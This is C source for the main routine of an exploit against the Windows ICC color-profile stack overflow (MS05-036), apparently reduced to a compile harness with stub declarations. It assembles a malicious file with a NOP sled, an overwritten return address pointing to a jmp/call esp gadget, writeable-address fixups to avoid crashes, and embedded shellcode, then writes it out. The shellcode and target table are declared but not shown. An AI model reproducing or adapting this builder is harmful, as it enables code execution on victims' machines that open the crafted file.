
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {unsigned int writeable_add; unsigned int jmpADD; } ;
typedef int DWORD ;


 int TARGET ;
 int atoi (char*) ;
 int buff ;
 int buildfile () ;
 int content_size_offset ;
 int dword_revert (int,unsigned int) ;
 int exit (int ) ;
 int list_target () ;
 int memset (int,int,unsigned int) ;
 int no_access_violate ;
 int no_access_violate2 ;
 int printf (char*,...) ;
 int ret_addr_offset ;
 int shellcode ;
 int sscanf (char*,char*,long*) ;
 int stack_land_offset ;
 unsigned int strlen (int ) ;
 int strncpy (int,int ,unsigned int) ;
 int t2b (unsigned int) ;
 int tag_content_offset ;
 TYPE_1__* targets ;

int main(int argc, char *argv[])
{
int i=0, t=TARGET, size=0;
int shal = 0;
unsigned int sc_size = strlen(shellcode);
unsigned int tag_size = stack_land_offset - tag_content_offset + 1 + sc_size ;
long fRetaddr = 0x00;

if (argc < 2) {
printf("\n\n");

printf("* Windows ICC stack overflow exploit (MS05-36)\n");
printf("* Code Execution Exploit\n");
printf("* (c) Darkeagle [ private code ]\n");
printf("* usage -> ms05-036 <target> (jmp/call esp)\n");
list_target() ;
exit(0);
}

t=atoi(argv[1]);

if ( argc == 3 )
sscanf(argv[2], "0x%x", &fRetaddr);

memset(buff + tag_content_offset, 0x90,tag_size);

*(DWORD*)(buff + no_access_violate2) = t2b(targets[t-1].writeable_add);
*(DWORD*)(buff + no_access_violate) = t2b(0x4);
if ( fRetaddr == 0x00 )
{
*(DWORD*)(buff + ret_addr_offset) = t2b(targets[t-1].jmpADD);
} else {
*(DWORD*)(buff + ret_addr_offset) = t2b(fRetaddr);
}
strncpy(buff + stack_land_offset, shellcode, sc_size);
dword_revert(buff + stack_land_offset, sc_size);

tag_size = (tag_size >> 2 << 2) + 4;
printf("current size: 0x%.8X\n",tag_size);
*(DWORD*)(buff + content_size_offset) = t2b(tag_size);

buildfile();

return 0;

}
